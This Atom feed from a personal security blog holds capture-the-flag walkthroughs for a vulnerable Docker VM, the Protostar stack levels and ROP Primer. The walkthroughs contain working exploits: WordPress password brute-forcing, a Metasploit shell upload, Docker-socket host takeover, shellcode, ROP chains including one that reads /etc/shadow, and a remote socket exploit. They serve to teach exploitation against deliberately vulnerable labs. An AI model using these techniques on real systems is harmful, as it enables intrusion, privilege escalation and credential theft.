<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vm | tcunha.github.io]]></title>
  <link href="http://tcunha.github.io/blog/categories/vm/atom.xml" rel="self"/>
  <link href="http://tcunha.github.io/"/>
  <updated>2018-07-21T09:18:11+00:00</updated>
  <id>http://tcunha.github.io/</id>
  <author>
    <name><![CDATA[tcunha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Vulnerable Docker VM: Hard]]></title>
    <link href="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard/"/>
    <updated>2017-11-01T11:20:17+00:00</updated>
    <id>http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard</id>
    <content type="html"><![CDATA[<p>Since this is running WordPress, the standard WPScan flags to enumerate
information were used. Nothing relevant popped besides its users:</p>

<pre><code class="console">    [snip]
    [+] Enumerating usernames ...
    [+] Identified the following 1 user/s:
        +----+-------+-----------------+
        | Id | Login | Name            |
        +----+-------+-----------------+
        | 1  | bob   | bob _ NotSoEasy |
        +----+-------+-----------------+
    [snip]
</code></pre>

<p>With this, brute-forcing seemed the next logical step. Used the rockyou wordlist
to obtain the password:</p>

<pre><code class="console">    [snip]
    +----+-------+------+----------+
    | Id | Login | Name | Password |
    +----+-------+------+----------+
    |    | bob   |      | Welcome1 |
    +----+-------+------+----------+
    [snip]
</code></pre>

<p>Logging in reveals the first flag in a WordPress draft:</p>

<pre><code class="console">    2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998
    [snip]
</code></pre>

<p>Decided with using Metasploit for an interactive shell:</p>

<pre><code class="console">    msf &gt; use exploit/unix/webapp/wp_admin_shell_upload
    msf exploit(wp_admin_shell_upload) &gt; set password Welcome1
    msf exploit(wp_admin_shell_upload) &gt; set rhost ...
    msf exploit(wp_admin_shell_upload) &gt; set rport 8000
    msf exploit(wp_admin_shell_upload) &gt; set user bob
    msf exploit(wp_admin_shell_upload) &gt; run
</code></pre>

<p>After unsuccessfully scouring the Web for an exploit that affected this kernel
version, tried to horizontally escalate privileges by finding containers on the
same user-defined network. To obtain more reliable results, a statically
compiled nmap was sent to the machine to perform a ping sweep and a TCP scan.</p>

<pre><code class="console">    Starting Nmap 7.11 ( https://nmap.org ) at 2017-11-01 09:46 UTC
    Cannot find nmap-payloads. UDP payloads are disabled.
    Nmap scan report for 172.18.0.1
    Host is up (0.00053s latency).
    Nmap scan report for content_db_1.content_default (172.18.0.2)
    Host is up (0.00040s latency).
    Nmap scan report for content_ssh_1.content_default (172.18.0.3)
    Host is up (0.00029s latency).
    Nmap scan report for 8f4bca8ef241 (172.18.0.4)
    Host is up (0.00025s latency).
    Nmap done: 256 IP addresses (4 hosts up) scanned in 2.97 seconds
</code></pre>

<pre><code class="console">    Starting Nmap 7.11 ( https://nmap.org ) at 2017-11-01 10:02 UTC
    Cannot find nmap-payloads. UDP payloads are disabled.
    Nmap scan report for 172.18.0.1
    Host is up (0.00016s latency).
    Not shown: 65533 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    8000/tcp open  http-alt

    Nmap scan report for content_db_1.content_default (172.18.0.2)
    Host is up (0.00049s latency).
    Not shown: 65534 closed ports
    PORT     STATE SERVICE
    3306/tcp open  mysql

    Nmap scan report for content_ssh_1.content_default (172.18.0.3)
    Host is up (0.00047s latency).
    Not shown: 65533 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    8022/tcp open  oa-system

    Nmap scan report for 8f4bca8ef241 (172.18.0.4)
    Host is up (0.00015s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap done: 4 IP addresses (4 hosts up) scanned in 6.19 seconds
</code></pre>

<p>Scanning revealed a potential target with port 8022/tcp open. Reaching it is
possible with meterpreter port-forwarding:</p>

<pre><code class="console">    meterpreter &gt; portfwd add -l 8192 -p 8022 -r 172.18.0.3
</code></pre>

<p>Accessing it on a browser spawns a shell on the DB container as root. While
enumerating this new container, noticed that the Docker socket is available in
the /var/run directory, thus, giving full control of the daemon on the host.</p>

<pre><code class="console">    / $ id
    uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<p>Since the vulnerable Virtual Machine wasn&rsquo;t started with NAT configured, to
interact with the UNIX domain socket, a locally and statically compiled cURL
was sent as base64 to the remote machine as a WordPress draft and extracted
with the MySQL client:</p>

<pre><code class="console">    / $ mysql -h 127.0.0.1 -u wordpress                                 \
        -e 'select post_content from wordpress.wp_posts where ID = 151' \
        -p &gt;curl
</code></pre>

<p>Next a container with a host bind mount was created and started by using the
REST API:</p>

<pre><code class="console">    / $ curl --unix-socket /var/run/docker.sock -XPOST                   \
        -H 'Content-Type: application/json'                              \
        -d '{ "Image": "wordpress:latest", "AttachStdin": true,          \
        "Tty": true, "Entrypoint": [ "/bin/sh", "-c" ], "HostConfig": {  \
        "Binds": [ "/:/srv" ] }, "Cmd": [ "sh " ] }'                     \
        http:/v1.24/containers/create?name=docker-root
    / $ curl --unix-socket /var/run/docker.sock -XPOST                   \
        -H 'Content-Type: application/json'                              \
        http:/v1.24/containers/docker-root/start
</code></pre>

<p>With a container created with full access to the host root directory under /srv,
it is only a matter of creating a tarball with a SSH public key (which can be
uploaded using the same method as above):</p>

<pre><code class="console">    / $ curl --unix-socket /var/run/docker.sock -XPUT                     \
        --upload-file key.tar                                             \
        http:/v1.24/containers/docker-root/archive?path=/srv/root/.ssh
</code></pre>

<p>Connecting via SSH on the externally standard available port:</p>

<pre><code class="console">    root@vulndocker:/# id
    uid=0(root) gid=0(root) groups=0(root)
    root@vulndocker:/# head -n1 flag_3
    d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Vulnerable Docker VM: Easy]]></title>
    <link href="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy/"/>
    <updated>2017-11-01T10:58:32+00:00</updated>
    <id>http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy</id>
    <content type="html"><![CDATA[<p>Scanning with nmap reveals that the host is exposing the Docker daemon on port
2375/tcp. Connecting and interacting with it is possible:</p>

<pre><code class="console">    # export DOCKER_HOST=tcp://172.19.0.108:2375
    # docker version
    Client:
     Version:      17.05.0-ce
     API version:  1.29
     Go version:   go1.8.1
     Git commit:   v17.05.0-ce
     Built:        Tue May 16 10:10:15 2017
     OS/Arch:      linux/amd64

    Server:
     Version:      17.06.0-ce
     API version:  1.30 (minimum version 1.12)
     Go version:   go1.8.3
     Git commit:   02c1d87
     Built:        Fri Jun 23 21:17:13 2017
     OS/Arch:      linux/amd64
     Experimental: false
</code></pre>

<p>Having direct access to the daemon is a big no-no. This gives the ability to
execute any commands on the remote daemon, like creating a new container and
taking advantage of the shared filesystem (-v) functionality, by bind-mounting
the host root directory and having access to all of its files:</p>

<pre><code class="console">    # docker run -v /:/srv -it --rm wordpress:latest bash
    root@23890602df34:/var/www/html# ls -l /srv
    total 80
    drwxr-xr-x   2 root root  4096 Aug 16 17:04 bin
    drwxr-xr-x   3 root root  4096 Aug 22 14:11 boot
    drwxr-xr-x  14 root root  4080 Nov  1 10:26 dev
    drwxr-xr-x  90 root root  4096 Nov  1 10:26 etc
    -r--------   1 root root   414 Aug 21 20:30 flag_3
    drwxr-xr-x   4 root root  4096 Aug 16 05:56 home
    lrwxrwxrwx   1 root root    34 Aug 16 08:30 initrd.img -&gt; boot/initrd.img-3.13.0-128-generic
    drwxr-xr-x  21 root root  4096 Aug 16 06:36 lib
    drwxr-xr-x   2 root root  4096 Aug 16 06:36 lib64
    drwx------   2 root root 16384 Aug 14 08:02 lost+found
    drwxr-xr-x   3 root root  4096 Aug 14 08:03 media
    drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt
    drwxr-xr-x   2 root root  4096 Apr 16  2014 opt
    dr-xr-xr-x 108 root root     0 Nov  1 10:26 proc
    drwx------   4 root root  4096 Aug 22 14:19 root
    drwxr-xr-x  19 root root   700 Nov  1 10:26 run
    drwxr-xr-x   2 root root  4096 Aug 16 17:04 sbin
    drwxr-xr-x   2 root root  4096 Apr 16  2014 srv
    dr-xr-xr-x  13 root root     0 Nov  1 10:26 sys
    drwxrwxrwt   2 root root  4096 Nov  1 10:30 tmp
    drwxr-xr-x  10 root root  4096 Aug 14 08:02 usr
    drwxr-xr-x  12 root root  4096 Aug 14 08:12 var
    lrwxrwxrwx   1 root root    31 Aug 16 08:30 vmlinuz -&gt; boot/vmlinuz-3.13.0-128-generic
</code></pre>

<p>Since when running nmap revealed that the host is also making use of SSH, having
the host root directory mapped, it&rsquo;s only a matter of generating a key and
logging in to get root on the compromised host:</p>

<pre><code class="console">    root@vulndocker:~# id
    uid=0(root) gid=0(root) groups=0(root)
    root@vulndocker:/# head -n1 /flag_3
    d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack]]></title>
    <link href="http://tcunha.github.io/blog/2015/12/29/protostar-stack/"/>
    <updated>2015-12-29T18:58:57+00:00</updated>
    <id>http://tcunha.github.io/blog/2015/12/29/protostar-stack</id>
    <content type="html"><![CDATA[<h2>stack0</h2>

<p>Nice refresher with regards to the volatile type qualifier. It is needed to
prevent the compiler from optimizing it away, given that it&rsquo;s &ldquo;always&rdquo; set to
zero (it might remove the if condition altogether). This is specially true for
signal handlers:</p>

<pre><code class="c">    sig_atomic_t    quit = 0;   /* Needs volatile! */

    void
    sigterm(int sig)
    {
        quit = 1;
    }

    while (quit != 0) { /* This might be transformed to while (true). */
        ...
    }
</code></pre>

<p>Given that the buffer is 64 bytes in size and the stack layout, writing one more
will copy one over modified:</p>

<pre><code>H +-------------+
  | ...         |
  | modified    |
  | buffer[64]  |   /* Being power of two means that it's aligned. */
  | ...         |
L +-------------+
</code></pre>

<p>To trigger the condition, the following command can be issued:</p>

<pre><code class="console">    $ python -c 'print "1" * 65'|./stack0
    you have changed the 'modified' variable
</code></pre>

<h2>stack1</h2>

<p>Like the above, given that the address of modified is four bytes above the
buffer and (like the exercise says) by taking into account that this is a little
endian platform (i386):</p>

<pre><code class="console">    $ ./stack1 `python -c 'print "A" * 64 + "\x64\x63\x62\x61"'`    # or,
    you have correctly got the variable to the right value
    $ ./stack1 `python -c 'print "A" * 64 + "dcba"'`
    you have correctly got the variable to the right value
</code></pre>

<h2>stack2</h2>

<p>The same as the last one but with an environment variable:</p>

<pre><code class="console">    $ env GREENIE="`python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`" ./stack2
    you have correctly modified the variable
</code></pre>

<h2>stack3</h2>

<p>Disassembling, like the exercise says, with objdump and retrieving the address
of the win() function yields the expected results:</p>

<pre><code class="objdump">    $ objdump -d stack3|grep win
    08048424 &lt;win&gt;:
</code></pre>

<pre><code class="console">    $ python -c 'print "A" * 64 + "\x24\x84\x04\x08"'|./stack3
    calling function pointer, jumping to 0x08048424
    code flow successfully changed
</code></pre>

<h2>stack4</h2>

<p>A poor man&rsquo;s fuzzer can be used to guess the EIP address (and while at it, to
take advantage of the redirect operator in gdb, like the exercise says):</p>

<pre><code class="console">    $ python -c 'print "A" * offset + "B" * 4' &gt;/tmp/dump
    $ gdb ./stack4
    (gdb) r &lt;/tmp/dump
</code></pre>

<p>The offset should be incremented until (76) the program crashes with a segfault
in the 0x42424242 address. Now that EIP is under control, the above can be used
to obtain the address of win:</p>

<pre><code class="objdump">    $ objdump -d stack4|grep win
    080483f4 &lt;win&gt;:
</code></pre>

<pre><code class="console">    $ python -c 'print "A" * 76 + "\xf4\x83\x04\x08"'|./stack4
    code flow successfully changed
    Segmentation fault
</code></pre>

<p>The padding, like the exercise says, is added by the compiler.</p>

<h2>stack5</h2>

<p>This was kind of tricky, since the stack isn&rsquo;t in the same place inside and
outside GDB. The environment and the arguments vector (ie argv) must be the
same.</p>

<p>First, brute-forced the number of bytes needed to overwrite EIP (76 in this
case) and obtained the address of the stack with GDB:</p>

<pre><code>$ python -c 'print "A" * 76 + "B" * 4 + "C" * 32' &gt;/tmp/boom
$ env - TERM=xterm PWD=$PWD gdb /opt/protostar/bin/stack5
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
TERM=xterm
PWD=/tmp
(gdb) r &lt;/tmp/boom
(gdb) info registers
(gdb) x/x $esp
0xbffffe30: 0x43434343
</code></pre>

<p>Generated the shellcode with:</p>

<pre><code class="console">    # msfvenom -p linux/x86/exec -f py -a x86 --platform linux CMD=/bin/sh
    No encoder or badchars specified, outputting raw payload
    Payload size: 43 bytes
    buf =  ""
    buf += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
    buf += "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"
    buf += "\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"
    buf += "\x89\xe1\xcd\x80"
</code></pre>

<p>As for the exploit:</p>

<pre><code class="python">    #!/usr/bin/python

    from struct import pack

    off = 76
    esp = pack("&lt;L", 0xbffffe30)

    buf =  ""
    buf += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
    buf += "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"
    buf += "\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"
    buf += "\x89\xe1\xcd\x80"

    payload = "A" * off
    payload += esp
    payload += buf

    print payload
</code></pre>

<p>Then, ensure that the environment is the same as the above (without changing
directories due to $PWD):</p>

<pre><code class="console">    $ (python /tmp/boom.py; cat)|   \
      env - TERM=xterm PWD=$PWD     \
      /opt/protostar/bin/stack5
    id
    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>

<h2>stack6</h2>

<p>With the usual methodology, it was noticed that EIP is under control when
overwriting at least eighty characters. The traditional ret2libc with the
system function and faking a stack frame works as expected:</p>

<pre><code class="python">    #!/usr/bin/python

    from struct import pack

    off = 80
    sys = pack("&lt;L", 0xb7ecffb0)    # system(3)
    sh = pack("&lt;L", 0xbfffffb8)     # /bin/sh

    payload = "A" * off
    payload += sys
    payload += "FAKE"
    payload += sh

    print payload
</code></pre>

<p>The /bin/sh address might need the usual guessing and setting a regular
environment inside and outside GDB:</p>

<pre><code class="console">    $ (python /tmp/boom.py; cat)|                   \
      env - SHELL=/bin/sh TERM=xterm PWD=$PWD       \
      /opt/protostar/bin/stack6
    input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAA��AKE����
    id
    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>

<p>As for the ROP one, I&rsquo;ve opted by using a rather pointless open(2), read(2),
write(2) and finally system(3) chain to play around a little. The gadgets
addresses can be obtained by using objdump. Jumping to the middle of a multiple
pop sequence might be needed and that&rsquo;s okay.</p>

<pre><code class="python">    #!/usr/bin/python

    from struct import pack

    off = 80

    # int open(const char *, int);
    openaddr = pack("&lt;L", 0xb7f537a0)
    pop2 = pack("&lt;L", 0x08048452)
    openpath = pack("&lt;L", 0xbfffffd6)       # SHADOW variable.
    openflgs = pack("&lt;L", 0x0)              # O_RDONLY

    # ssize_t read(int, void *, size_t);
    readaddr = pack("&lt;L", 0xb7f53c00)
    pop3 = pack("&lt;L", 0x08048576)
    readfd = pack("&lt;L", 0x3)                # Only the standard ones are open.
    readbuf = pack("&lt;L", 0xbffff73c)        # getpath() buffer.
    readcnt = pack("&lt;L", 0x40)              # 64 bytes.

    # ssize_t write(int, const void *, size_t);
    writeaddr = pack("&lt;L", 0xb7f53c70)
    writefd = pack("&lt;L", 0x2)               # stderr is unbuffered.
    writebuf = readbuf
    writecnt = readcnt

    # int system(const char *);
    sysaddr = pack("&lt;L", 0xb7ecffb0)
    pointless = "FAKE"
    syscmd = pack("&lt;L", 0xbfffffc7)         # SHELL variable.

    payload = "A" * off
    payload += openaddr + pop2 + openpath + openflgs
    payload += readaddr + pop3 + readfd + readbuf + readcnt
    payload += writeaddr + pop3 + writefd + writebuf + writecnt
    payload += sysaddr + pointless + syscmd

    print payload
</code></pre>

<p>Beware that the environment inherited from the parent may play tricks due to not
being the same. Executing it through a clean environment all the time, such as
the one below, solves this kind of issues:</p>

<pre><code class="console">    $ (python /tmp/boom.py; cat)|                                  \
      env - TERM=xterm PWD=$PWD SHELL=/bin/sh SHADOW=/etc/shadow   \
      /opt/protostar/bin/stack6
    input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�7��AAAAAAAAAAAA�7��R��
    root:$6$gOA4/iAf$EMw.4yshZLZxjlf./VmnEVQ20QsEmdzZa73csPGYGG6KC.rid
    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>

<p>The stack with the above ROP will look like:</p>

<pre><code>H +---------------------+
  | ret (the variable)  |
  | buffer [0x41 * 80]  | &lt;= 0xbffff73c
  | open(2)             | &lt;= 0xb7f537a0
  | POP POP RET         | &lt;= 0x08048452
  | /etc/shadow         | &lt;= SHADOW variable.
  | openflgs            | &lt;= O_RDONLY
  | read(2)             | &lt;= 0xb7f53c00
  | POP POP POP RET     | &lt;= 0x08048576
  | 0x3                 |
  | buffer              | &lt;= 0xbffff73c
  | 0x40                |
  | write(2)            | &lt;= 0xb7f53c70
  | POP POP POP RET     | &lt;= 0x08048576
  | 0x2                 |
  | buffer              | &lt;= 0xbffff73c
  | 0x40                |
  | system(3)           | &lt;= 0xb7ecffb0
  | FAKE                |
  | /bin/sh             | &lt;= SHELL variable.
L +---------------------+
</code></pre>

<h2>stack7</h2>

<p>Like the one above, this also places restrictions in the address that we are
allowed to jump to. Therefore, like the exercise says we need to bypass this
restriction by returning to a text section.</p>

<p>Decided with a straight ret opcode one, that pops the last value from the stack
and updates EIP to that address (the system(3) function).</p>

<pre><code class="python">    #!/usr/bin/python

    from struct import pack

    off = 80
    ret = pack("&lt;L", 0x080484c2)    # the ret instruction (frame_dummy)
    sys = pack("&lt;L", 0xb7ecffb0)    # system(3)
    sh = pack("&lt;L", 0xbfffffbd)     # /bin/sh

    payload = "A" * off 
    payload += ret
    payload += sys
    payload += "FAKE"
    payload += sh

    print payload
</code></pre>

<pre><code class="console">    $ (python /tmp/boom.py; cat)|                   \
      env - TERM=xterm PWD=$PWD SHELL=/bin/sh       \
      /opt/protostar/bin/stack7
    input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AKE��
    id
    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP Primer: 0.2]]></title>
    <link href="http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2/"/>
    <updated>2015-11-12T01:31:07+00:00</updated>
    <id>http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2</id>
    <content type="html"><![CDATA[<h2>level0</h2>

<p>Started, as usual, by fetching the number of characters needed to overflow the
name. The regular MSF pattern-create (or its alternatives like peda) approach
can be used. In this case consider that 44 bytes are needed to overflow.</p>

<p>The system(3) function doesn&rsquo;t seem to be linked in the library. On purpose,
most likely. One can use the mprotect(2) system call to bypass the NX protection
(which isn&rsquo;t allowed under PaX) on the stack by making a small portion of its
pages as executable and read a shellcode into that location from standard input.</p>

<p>The Python code below was used to create two additional (fake) stack frames:</p>

<pre><code class="python">    #!/usr/bin/python

    from struct import pack

    off = 44

    mprotectaddr = pack("&lt;L", 0x080523e0)
    pop3 = pack("&lt;L", 0x08048882)
    mprotectarg1 = pack("&lt;L", 0xbffdf000) # Stack address.
    mprotectlen = pack("&lt;L", 0x100)       # Address length.
    mprotectflgs = pack("&lt;L", 0x7)        # PROT_READ|PROT_WRITE|PROT_EXEC

    readaddr = pack("&lt;L", 0x080517f0)
    readfd = pack("&lt;L", 0x0)              # Read from standard input.
    readbuf = mprotectarg1
    readcnt = mprotectlen

    payload = "A" * off
    payload += mprotectaddr + pop3 + mprotectarg1 + mprotectlen + mprotectflgs
    payload += readaddr + pop3 + readfd + readbuf + readcnt
    payload += readbuf                    # Jump to the marked stack area.

    print payload
</code></pre>

<p>The (not encoded) shellcode was generated using msfvenom:</p>

<pre><code class="console">    # msfvenom -p linux/x86/exec -f py CMD=/bin/sh 2&gt;&amp;1|    \
        tail -n+6|                                          \
        sed -e 's,buf += ",,' -e 's,",,g'|                  \
        tr -d '\n'
</code></pre>

<p>And, finally, executed with:</p>

<pre><code class="console">    level0@rop:~$ (python boom.py; python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"'; cat)|/home/level0/level0
    [+] ROP tutorial level0
    [+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#!
    cat flag
    flag{rop_the_night_away}
</code></pre>

<h2>level1</h2>

<p>This first needs some code analysis to figure out where exactly the overflow
occurs. The issue here is that the (specified) file&rsquo;s size (and therefore under
control) is also being used when reading its (path) name from the socket:</p>

<pre><code class="c">    char filename[32], cmd[32];
    char text[256];
    int read_bytes, filesize;
    char str_filesize[7];

    [...]

    /* Read the file size from the socket. */
    read(fd, &amp;str_filesize, 6);
    filesize = atoi(str_filesize);
    char *filebuf = malloc(filesize); &lt;---------------------+
                                                            |
    write_buf(fd, " Please, send your file:\n\n");          |
    write_buf(fd, "&gt; ");                                    | related
                                                            | to
    /* Read the file of size filesize. */                   |
    read_bytes = read(fd, filebuf, filesize); &lt;-------------+
                                                            |
    [...]                                                   |
                                                            |
    write_buf(fd, " Please, give a filename:\n");           | not
    write_buf(fd, "&gt; ");                                    | related
                                                            | to
    /* Read the file name from the socket. */               |
    memset(filename, 0, sizeof(filename));                  |
    read_bytes = read(fd, filename, filesize); &lt;------------+
</code></pre>

<p>One can give a filesize of 128 bytes but provide a bigger filename (which is
fixed at 32 bytes of size). The read(2) call should have been:</p>

<pre><code class="c">    read_bytes = read(fd, filename, sizeof(filename) - 1);
    filename[read_bytes] = '\0';
</code></pre>

<p>Keep in mind the file descriptor count of the child process:</p>

<pre><code> parent
+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; listenfd
| 4    | =&gt; connfd (closed in the while loop before the accept call)
+------+

 child
+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; flag file fd (previously listenfd, closed in main; freed)
| 4    | =&gt; connfd
+------+
</code></pre>

<p>Then, the addresses of the open(2), read(2) and write(2) that are used by the
binary in the PLT section were retrieved:</p>

<pre><code class="objdump">    $ objdump -D level1|grep -E "(open|read|write)@plt&gt;:"
    08048640 &lt;read@plt&gt;:
    080486d0 &lt;open@plt&gt;:
    08048700 &lt;write@plt&gt;:
</code></pre>

<p>Followed by the address of an unused and writable section in the ELF file that
<em>can</em> (data section has eight bytes only) and will hold the contents of the flag
file:</p>

<pre><code class="console">    $ readelf -S level1|grep WA
    [19] .init_array       INIT_ARRAY      0804a2f8 0012f8 000004 00  WA  0   0  4
    [20] .fini_array       FINI_ARRAY      0804a2fc 0012fc 000004 00  WA  0   0  4
    [21] .jcr              PROGBITS        0804a300 001300 000004 00  WA  0   0  4
    [22] .dynamic          DYNAMIC         0804a304 001304 0000f0 08  WA  7   0  4
    [23] .got              PROGBITS        0804a3f4 0013f4 000004 04  WA  0   0  4
    [24] .got.plt          PROGBITS        0804a3f8 0013f8 00006c 04  WA  0   0  4
    [25] .data             PROGBITS        0804a464 001464 000008 00  WA  0   0  4
    [26] .bss              NOBITS          0804a46c 00146c 000004 00  WA  0   0  4
</code></pre>

<p>0xf0 bytes is more than enough to hold the 53 bytes of the file. Since the
binary also has the flag character array (NUL terminated), its address can be
used, instead:</p>

<pre><code class="objdump">    # if (strstr(filename, "flag")) &lt;== This one here.
    $ objdump -s -j .rodata level1|grep flag
    8049128 666c6167 00000000 20205845 52584553  flag....  XERXES
</code></pre>

<p>As for the exploit:</p>

<pre><code class="python">    #!/usr/bin/python

    from socket import *
    from struct import pack

    off = 64
    pop2 = pack("&lt;L", 0x08048ef7)
    pop3 = pack("&lt;L", 0x08048ef6)

    openaddr = pack("&lt;L", 0x080486d0) # open@plt
    openpath = pack("&lt;L", 0x08049128) # The flag string in the data section.
    openflgs = pack("&lt;L", 0x0)        # O_RDONLY.

    readaddr = pack("&lt;L", 0x08048640) # read@plt
    readfd = pack("&lt;L", 0x3)          # Read from the newly created descriptor.
    readbuf = pack("&lt;L", 0x0804a304)  # Read contents to the dynamic section.
    readcnt = pack("&lt;L", 0xf0)        # Size of the dynamic ELF section.

    writeaddr = pack("&lt;L", 0x08048700) # write@plt
    writefd = pack("&lt;L", 0x4)          # Write to the original socket file descriptor.
    writebuf = readbuf
    writecnt = readcnt

    payload = "A" * off
    payload += openaddr + pop2 + openpath + openflgs
    payload += readaddr + pop3 + readfd + readbuf + readcnt
    payload += writeaddr + "BOOM" + writefd + writebuf + writecnt

    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("192.168.56.101", 8888))

    print s.recv(1024)  # Banner.
    s.send("store")     # The internal application command.
    print s.recv(1024)  # How many bytes in your file?
    s.send("128")       # Must be bigger than the 32 bytes of the filename.
    print s.recv(1024)  # Please send your file (the contents).
    s.send("boom")
    print s.recv(1024)  # Error treatment and filename.
    s.send(payload)
    print s.recv(1024)
    s.send("exit")      # The internal application command.

    print s.recv(1024)  # To get the contents of the flag file.
    s.close()
</code></pre>

<p>At last, called the above Python code to remotely extract the contents of the
file:</p>

<pre><code class="console">    # python boom.py 
    Welcome to 

     XERXES File Storage System
      available commands are:
      store, read, exit.

    &gt;
     Please, how many bytes is your file?


    &gt;
     Please, send your file:

    &gt;
       XERXES regrets to inform you
        that an error occurred
            while receiving your file.
     Please, give a filename:
    &gt; flag{just_one_rop_chain_a_day_keeps_the_doctor_away}
</code></pre>

<h2>level2</h2>

<p>The bad characters list should be enumerated by sending them in sequence, firing
up gdb and checking the stack values. For instance:</p>

<pre><code>gdb-peda$ x/64x $esp
0xbffff5c0:   0x04030201      0x08070605      0xbffff600      0x00000000
                                ^^^^^^^^
                                no \x09
</code></pre>

<p>Then, it is a matter of choosing the correct gadgets by taking into account the
above bad characters. Decided by using the already present strcpy(3) function in
the binary and copy the /bin/sh character array (character by character) to the
BSS segment and using a gadget to store a NUL byte by zeroing the eax register
first and using a mov instruction.</p>

<p>Since this is running Linux x86, one can take advantage of the interrupt gadget
by moving into eax the execve system call number and into ebx the address of the
/bin/sh character array (which is in the BSS section).</p>

<pre><code class="python">    #!/usr/bin/python

    from struct import pack

    off = 44
    badchars = "\x00\x09\x0a\x20"   # List of bad characters.
    bss = 0x080cab40                # The address of the BSS section.
    execvenb = 11                   # System call execve number.

    # Functions.
    bssaddr = pack("&lt;L", bss)
    strcpyaddr = pack("&lt;L", 0x08051160)

    # Gadgets.
    boom = pack("&lt;L", 0x41424344)     # dummy
    pop2 = pack("&lt;L", 0x08048893)
    syscall = pack("&lt;L", 0x08052ba0)
    xoreax = pack("&lt;L", 0x0808d2cd)   # xor eax,eax|pop ebp|ret
    inceax = pack("&lt;L", 0x08083d82)   # inc eax|ret
    movedx = pack("&lt;L", 0x08078e71)   # mov dword ptr [edx],eax|ret
    popedx = pack("&lt;L", 0x08052476)
    popebx = pack("&lt;L", 0x0805249e)

    # Characters.
    slashaddr = pack("&lt;L", 0x08048483)
    baddr = pack("&lt;L", 0x0804b262)
    iaddr = pack("&lt;L", 0x0804a0ca)
    naddr = pack("&lt;L", 0x08048b65)
    saddr = pack("&lt;L", 0x08048110)
    haddr = pack("&lt;L", 0x08048113)

    payload = "A" * off
    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 0) + slashaddr  # /
    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 1) + baddr      # b
    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 2) + iaddr      # i
    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 3) + naddr      # n
    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 4) + slashaddr  # /
    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 5) + saddr      # s
    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 6) + haddr      # h
    payload += xoreax + boom                # The xor gadget also pops.
    payload += popedx + pack("&lt;L", bss + 7) # Put the address of BSS + 7.
    payload += movedx                       # Store a NUL after the string.
    payload += xoreax + boom                # The xor gadget also pops.
    payload += inceax * execvenb            # eax = 11.
    payload += popebx + bssaddr             # ebx = "/bin/sh\0"
    payload += syscall

    print payload
</code></pre>

<p>In conclusion, the execution of the SUID binary with the payload as an argument
to capture the flag:</p>

<pre><code class="console">    level2@rop:~$ ./level2 `python boom.py`
    [+] ROP tutorial level2
    [+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#@#
                                                                                                 ##A#
                                                                                                    b#B#
                                                                                                       #C#
                                                                                                         e#D#
                                                                                                            ##E#
                                                                                                               #F#
                                                                                                               DCBAvG#
                                                                                                                    DCBA#@#
                                                                                                                          #!
